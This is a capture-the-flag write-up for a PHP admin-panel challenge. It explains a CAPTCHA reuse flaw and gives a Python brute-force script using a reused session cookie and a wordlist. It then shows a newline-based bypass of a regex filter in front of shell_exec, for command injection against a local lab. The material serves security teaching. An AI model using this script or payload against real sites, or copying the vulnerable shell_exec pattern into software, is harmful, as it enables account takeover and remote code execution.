# Super Secure Admin Panel
Super Secure Admin Panel is a web challenge involving bypassing a CAPTCHA to facilitate brute forcing of an admin's password, then bypassing a regex that prevents command injection for RCE.

## CAPTCHA bypass
We're presented with an admin panel login that requires a username, password and CAPTCHA value. The CAPTCHA is created in the `captcha.php` file, by following this tutorial: https://www.allphptricks.com/create-a-simple-captcha-script-using-php/. This tutorial has a logic flaw in it that is included in many PHP CAPTCHA tutorials.

We can view the authentication code inside `login.php`:

```php
<?php
    session_start();

    $error = "";
    
    if(isset($_POST["username"]) && isset($_POST["password"]) && isset($_POST["captcha"]))
    {
        if (!isset($_SESSION["captcha"]) || $_POST['captcha'] !== $_SESSION["captcha"]) {
            $error = "
            The captcha value was incorrect.
            ";
        }
        else
        {
            // Password is different on remote!
            if(!($_POST["username"] === "admin" && $_POST["password"] === "password")) {
                $error = "
                The username or password was incorrect.
                ";
            }
            else
            {
                // Log admin in
                $_SESSION["isAdmin"] = true;
                header("Location: /");
                die();
            }
        }
    }
?>
```

We can see that it checks for a username, password and captcha within the form data, checks the submitted captcha value against `$_SESSION["captcha"]` then checks the username and password. If the username and password match, `$_SESSION["isAdmin"]` is set to true, allowing us to access the admin page. `$_SESSION["captcha"]` is set at the bottom of `captcha.php`, where `$captcha_code` is the code in the image:

```php
/* Show captcha image in the html page */
// defining the image type to be shown in browser widow
header('Content-Type: image/jpeg'); 
imagejpeg($captcha_image); //showing the image
imagedestroy($captcha_image); //destroying the image instance
$_SESSION['captcha'] = $captcha_code;
```

The logic flaw within this code is that the CAPTCHA is subject to a reuse attack. This is where an attacker can re-use the same CAPTCHA value for different requests. As the value of the CAPTCHA is stored within the PHP session and is only generated when visiting `/captcha.php`, if an attacker does not visit this page but reuses a previous `PHPSESSID` cookie, their CAPTCHA value will never change, allowing them to brute force the login page.

To fix this, all the developer needed to do was to ensure that `$_SESSION["captcha"]` is deleted after each usage, forcing the user to get a new CAPTCHA value to submit the form again.

For us to exploit this, we can write a simple Python script to login once, ask the user to solve the CAPTCHA, then save the `PHPSESSID` cookie to use for brute forcing.

```python
import requests

session = requests.Session()

response = session.get("http://localhost:8080/login.php")

phpsessid = response.cookies["PHPSESSID"]
print(f"[+] Got PHPSESSID: {phpsessid}")

captcha_image = session.get("http://localhost:8080/captcha.php")

with open("captcha.jpg", "wb") as captcha_file:
    captcha_file.write(captcha_image.content)

captcha = input("What is the captcha value stored in captcha.jpg: ")

# Attempt login to ensure valid cookie
response = requests.post(
    "http://localhost:8080/login.php",
    cookies={"PHPSESSID": phpsessid},
    data={"username": "josh", "password": "josh", "captcha": captcha},
)

if "username or password" not in response.text:
    print("[!] Captcha value was wrong")
    exit()

print("[+] Captcha value valid, brute-forcing password...")

with open("/wordlists/rockyou.txt") as wordlist:
    for password in wordlist.readlines():
        response = requests.post(
            "http://localhost:8080/login.php",
            cookies={"PHPSESSID": phpsessid},
            data={"username": "admin", "password": password, "captcha": captcha},
        )

        if "incorrect" not in response.text:
            print(response.text)
            print("[+] Found valid password:", password)
            exit()

        print("[-] Invalid password:", password)
```

After a while, our script finds the valid password for the admin: `cassandra`.

### Bypassing regex
At the top of `index.php`, we can see how the `operation` GET parameter works.

```php
if(isset($_GET["operation"]))
{
    // Just in case we get hacked...
    $safetyRegex = "/^.*[\^$(){}`&;*,|\-\"\'~].*$/";
    if(preg_match($safetyRegex, $_GET["operation"]))
    {
        die("Invalid operation detected!");
    }

    $operationOutput = shell_exec($_GET["operation"]);
}
```

The regex checks for a variety of different special characters within bash, and if the GET parameter does not match that regex, it will be ran using `shell_exec`. While PHP offers functions to sanitise user input for passing to the shell, the developer chose to use a poorly implemented filtering approach instead. The regex checks from the start of the line, matches any characters zero to unlimited times, matches any of the special characters, then matches any characters zero to unlimited times, then matches the end of the line. However, because of the matching of the start and end of the line and the fact it doesn't use the `m` regex flag (which matches over multiple lines), simply including a new line in the GET parameter will bypass the regex check, as the second line will not be fed through the regex.

Therefore, we can use the URL encoded newline value (`%0A`) to bypass the regex:

```
http://localhost:8080/index.php?operation=uptime%0Acat%20/flag.txt
WMG{wAI7_all_7Ho53_php_cAp7Cha_7U7Orial5_AR3_wroN9???}
```